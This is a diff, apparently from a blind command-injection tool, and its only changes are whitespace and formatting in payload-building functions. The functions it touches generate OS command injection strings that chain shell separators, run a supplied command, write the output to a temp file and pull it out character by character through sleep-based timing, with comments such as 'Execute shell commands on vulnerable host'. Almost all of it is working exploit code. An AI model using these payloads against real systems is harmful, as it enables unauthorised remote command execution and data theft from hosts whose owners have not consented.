@@ -24,7 +24,8 @@ import urllib
 #----------------------------------------------------------------
 # Tempfile-based decision payload (check if host is vulnerable).
 #----------------------------------------------------------------
-def decision(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
+def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
+
   if separator == ";" :
     payload = (separator + " "
               "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
@@ -68,11 +69,11 @@ def decision(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
+def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
 
   if separator == ";" :
     payload = (separator + " "
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ TAG + "')\nf.close()\n\")" + separator + " "
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")" + separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ separator + " "
               "if [ " + str(j) + " -ne ${str1} ]" + separator  + " "
@@ -89,7 +90,7 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
       ampersand = "&"
     payload = (ampersand + " " +
               "$(python -c \"import time\ntime.sleep(0)\") " + separator + " "
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ TAG + "')\nf.close()\n\")" + separator + " "
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('"+ TAG + "')\nf.close()\n\")" + separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator + " "
               "[ " + str(j) + " -eq ${str1} ] " + separator + " "
@@ -100,7 +101,7 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
 
   elif separator == "||" :
     payload = (separator + " " +
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")\n" + " "
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")\n" + " "
               # Find the length of the output, using readline().
                "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\") "
@@ -113,7 +114,8 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
 #-----------------------------------------------
 # Execute shell commands on vulnerable host.
 #-----------------------------------------------
-def cmd_execution(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
+def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
+
   if separator == ";" :
     payload = (separator + " "
               "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
@@ -157,10 +159,11 @@ def cmd_execution(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
 """
 __Warning__: The alternative shells are still experimental.
 """
-def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
+def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
+
   if separator == ";" :
     payload = (separator + " "
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" + separator + " "
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" + separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ separator + " "
               "if [ " + str(j) + " != ${str1} ] " + separator +
@@ -177,7 +180,7 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
       ampersand = "&"
     payload = (ampersand + " " +
               "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" +  separator + " "
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" +  separator + " "
               # Find the length of the output, using readline().
               "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator + " "
               "[ " + str(j) + " -eq ${str1} ] " +  separator + " "
@@ -188,7 +191,7 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
     
   elif separator == "||" :                
     payload = (separator + " "
-              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" + " | " + 
+              "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")" + " | " + 
               # Find the length of the output, using readline().
               "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
@@ -201,7 +204,8 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
 #---------------------------------------------------
 # Get the execution ouput, of shell execution.
 #---------------------------------------------------
-def get_char(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_request_method):
+def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
+  
   if separator == ";" :
     payload = (separator + " "
               "str=$(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
@@ -239,7 +243,7 @@ def get_char(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_reques
 """
 __Warning__: The alternative shells are still experimental.
 """
-def get_char_alter_shell(separator,OUTPUT_TEXTFILE,num_of_chars,ascii_char,delay,http_request_method):
+def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
   
   if separator == ";" :
     payload = (separator + " "
